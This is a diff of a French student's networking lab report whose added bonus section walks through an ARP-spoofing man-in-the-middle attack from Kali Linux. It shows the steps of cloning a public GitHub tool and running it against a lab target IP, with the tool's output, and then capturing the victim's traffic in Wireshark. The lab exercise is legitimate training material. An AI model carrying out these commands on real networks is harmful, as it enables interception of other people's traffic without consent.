@@ -84,10 +84,6 @@ et la réponse
 
 ## 1. Basics
 
-
-
-
-
 ##### ❓ Déterminer
 
 - pour la carte réseau impliquée dans le partage de connexion (carte WiFi ?)
@@ -170,12 +166,67 @@ Interface : 192.168.87.15 --- 0xe
 
 ## Bonus
 
+Pour ce travail j'ai utilisé 2 manières sur l'OS **KALI** !
 
-##### ❓ 
+##### ❓ Mettre en place un MITM
 
+#### Ettercap :
 
+En vraie, je vais juste donner un tuto, malgré tout, c'est sympa, on peut le faire avec toute ma maison.
 
-##### ❓ 
+https://www.youtube.com/watch?v=_44MLJMweig
 
-##### ❓ 
+#### Un script Python sur Github
 
+Pour ce test, j'ai utilisé le dépôt " https://github.com/EONRaider/Arp-Spoofer "
+
+Pour commencer je **clone** le Git
+```bash
+┌──(kali㉿kali)-[~/Desktop/test]
+└─$ git clone https://github.com/EONRaider/Arp-Spoofer.git
+Cloning into 'Arp-Spoofer'...
+remote: Enumerating objects: 345, done.
+remote: Counting objects: 100% (45/45), done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 345 (delta 40), reused 36 (delta 36), pack-reused 300 (from 1)
+Receiving objects: 100% (345/345), 85.35 KiB | 292.00 KiB/s, done.
+Resolving deltas: 100% (209/209), done.
+```
+
+Une fois installer, je rentre dans mon dossier installer avec :
+```bash
+┌──(kali㉿kali)-[~/Desktop/test]
+└─$ cd Arp-Spoofer
+```
+
+Pour trouver ma cible sur le réseau si je ne la connais pas, je peux utiliser [Nmap](https://www.varonis.com/fr/blog/nmap-commands) avant de s'attaquer à elle, mais ici, je connais déjà ma cible `192.168.51.171`.
+
+Maintenant, que j'ai ma cible, je peux attaquer, ce script va automatiquement trouver ma passerelle, pour attaquer je n'est juste qu'à entrée `sudo python3 arpspoof.py [IP DE MA CIBLE] -f` en oublient pas de changer l'adresse IP de ma cible :
+
+```bash
+┌──(kali㉿kali)-[~/Desktop/test/Arp-Spoofer]
+└─$ sudo python3 arpspoof.py 192.168.51.171 -f
+[sudo] password for kali:
+
+[>>>] ARP Spoofing configuration:
+[+] IPv4 Forwarding .....................True
+[+] Interface       .....................eth0
+[+] Attacker MAC    ........08:00:27:ff:8e:e7
+[+] Gateway IP      ............192.168.51.15
+[+] Gateway MAC     ........82:ea:80:64:7f:ae
+[+] Target IP       ...........192.168.51.171
+[+] Target MAC      ........08:00:27:c2:7f:3b
+
+[!] ARP packets ready. Execute the attack with these settings? (Y/N)
+```
+
+Ici, il a bien trouvé la passerelle et sont adresse mac, de même pour ma cible, j'appuie sur " Y " et je fait entrée pour confirmé :
+
+```bash
+[!] ARP packets ready. Execute the attack with these settings? (Y/N) y
+
+[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.
+```
+TADA ! ça marche !
+
+Je peux maintenant ouvrir [wireshark](https://www.wireshark.org/docs/) dans ma VM Hôte pour voir tout les pâques envoyées par ma cible !
